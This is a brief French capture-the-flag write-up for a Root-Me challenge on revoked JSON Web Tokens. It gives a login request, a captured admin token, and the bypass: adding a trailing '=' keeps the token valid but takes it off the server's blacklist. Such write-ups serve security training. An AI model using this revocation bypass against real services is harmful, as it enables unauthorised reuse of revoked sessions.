https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Récupérer d'un JWT
```bash
POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  challenge01.root-me.org/web-serveur/ch63/login
```

On récupère le token


`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ1OTkyMTksIm5iZiI6MTc2NDU5OTIxOSwianRpIjoiZDNlYzEwMTAtZDM0Ni00YzE5LWFlYjUtYjliMmFlZDMxZTNlIiwiZXhwIjoxNzY0NTk5Mzk5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.1ApYjkYbXQqaMyHl_7kC8yJ-4TSlcYeuR78r4QP_jK4`

On peut modifier le token sans changer sa validité en rajoutant un `=` à la fin
Ainsi le token n'est plus blacklisté mais toujours valide

Resources:

- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf?_gl=1*iz8g0z*_ga*MTczOTUxMTk3MC4xNzYyMTg4MTcz*_ga_SRYSKX09J7*czE3NjQ1OTQ1MjMkbzMkZzEkdDE3NjQ1OTk2MDIkajYwJGwwJGgw

![Solution](img/6-result.png "Title")
